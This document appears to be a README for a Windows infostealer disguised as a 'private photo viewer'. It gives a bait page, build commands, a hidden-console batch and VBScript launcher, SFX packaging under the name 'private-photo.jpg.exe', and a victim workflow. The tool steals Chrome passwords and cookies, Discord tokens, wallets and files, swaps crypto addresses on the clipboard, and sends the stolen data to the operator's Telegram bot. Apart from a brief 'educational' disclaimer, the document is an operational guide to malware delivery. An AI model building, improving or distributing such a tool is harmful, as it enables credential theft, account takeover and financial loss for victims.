## Photo Stealer

**Educational Project**  
A stealthy Windows infostealer disguised as a **"Private Photo Viewer"**.  

Victims click on a blurry image → disguised `.exe` downloads automatically → silently steals data and sends results to your Telegram bot.

---

## Features

- Clean fake "Private Photo" bait page (hosted on Vercel)
- Auto-download disguised `.exe` when the image is clicked
- Silent execution (no visible console window)
- Anti-VM, Anti-Debugger, and Windows Defender bypass
- Steals Chrome passwords & cookies
- Steals Discord tokens
- Detects Telegram, WhatsApp, Signal, Slack, Element
- Clipboard crypto clipper
- Creates `output.zip` with stolen data
- Sends all stolen data to your Telegram bot

---

## Project Structure

```bash
simple-stealer/
├── main.js                  # Main entry point
├── fake-pages.js            # Fake blurry photo bait page
├── chrome-stealer.js        # Chrome passwords & cookies
├── socials-stealer.js       # Social apps detection & stealing
├── wallet-stealer.js        # Wallet extensions
├── file-grabber.js          # Important files grabber
├── exfil.js                 # Exfiltration to Telegram/Discord
├── clipper.js               # Crypto clipboard swapper
├── antivm.js                # Anti-VM detection
├── antidefender.js          # Windows Defender bypass
├── config.js                # Telegram & webhook config
├── photo_jpg.exe            # Final compiled executable
├── private-photo.jpg.exe    # Self-Extracting Archive (SFX)
├── view.bat                 # Startup script
├── run_hidden.vbs           # Hides console window
└── node_sqlite3.node        # Required for Chrome DB access
```
## Key Techniques Used
### 1. Social Engineering (Vercel Hosted Bait)

- Uses a blurry private/seductive photo as bait
- Victim clicks image → disguised .exe starts downloading
- High click rate due to curiosity

### 2. Stealth & Evasion

- hideConsole() + run_hidden.vbs → No visible console
- Advanced antivm.js → Detects VMs and analysis tools
- Self-Extracting Archive (SFX) with WinRAR for easy distribution

### 3. Data Collection

- Chrome passwords & cookies (sqlite3 + DPAPI)
- Discord tokens (LevelDB)
- Telegram tdata session detection
- File grabber (Documents, Downloads, Desktop, etc.)
- Wallet extensions

### 4. Packaging & Delivery

- Built with pkg into a single .exe
- Self-Extracting Archive (SFX) for easy distribution
- Disguised filename (private-photo.jpg.exe)

### 5. Exfiltration

- Sends stolen data to your Telegram bot
- Creates output.zip with all stolen files


## Compilation (Building the .exe)
```Bash 
pkg stealer.js \
  --targets node18-win-x64 \
  --output photo_jpg.exe \
  --no-bytecode \
  --public \
  --assets "node_sqlite3.node"
```
## After building, copy node_sqlite3.node from:
```animate-gaussian
node_modules\sqlite3\build\Release\node_sqlite3.node
```
and place it next to photo_jpg.exe.

## Running the Stealer
### Recommended method (silent):
Create view.bat:
```Bash
bat@echo off
cd /d "%~dp0"
wscript "run_hidden.vbs" "photo_jpg.exe"
exit
```
And run_hidden.vbs:
```Bash
vbscriptSet WshShell = CreateObject("WScript.Shell")
WshShell.Run """" & WScript.Arguments(0) & """", 0, False
```
Double-click view.bat to run silently.

## Create Self-Extracting Archive (SFX) with WinRAR

Put these files in one folder:
- photo_jpg.exe
- node_sqlite3.node
- view.bat
- run_hidden.vbs

## Right-click folder → Add to archive
Click ```**SFX**``` button and set:
#### Run after extraction: ```view.bat```
#### Silent mode: ```Hide all```
#### Unpack to temporary folder: Enabled

Name the final file: ```private-photo.jpg.exe```


## Vercel Deployment (Bait Page)

Create a folder called photo-bait
Put index.html inside it (the fake photo page)
Go to vercel.com → New Project → Create Empty Project
Drag and drop the photo-bait folder
Deploy

You will get a live link like: https://private-photo.vercel.app

## Full Workflow

Send the Vercel link to the victim
Victim sees blurry photo and clicks it
Disguised .exe downloads automatically
Victim runs the SFX file
Stealer runs silently in background
Data is collected and sent to your Telegram


## Legal & Educational Notice
This project is for educational and authorized penetration testing purposes only.
Unauthorized use on others without consent is illegal.

How to Improve Stealth
How to Update the Bait Page
Advanced Features
